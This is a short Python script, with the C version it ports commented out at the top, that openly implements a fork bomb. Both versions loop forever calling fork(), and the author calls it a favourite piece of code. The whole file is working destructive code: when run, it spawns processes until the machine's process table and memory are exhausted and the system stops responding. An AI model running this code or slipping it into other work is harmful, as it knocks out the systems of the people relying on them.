#Program to implement a fork bomb
#This is a reimplementation of my favrioute code in C
##include<stdio.h>
##include<unistd.h>
#int main(){
#	while(1){
#		fork();
#	}
#}

import os

while True:
     os.fork()
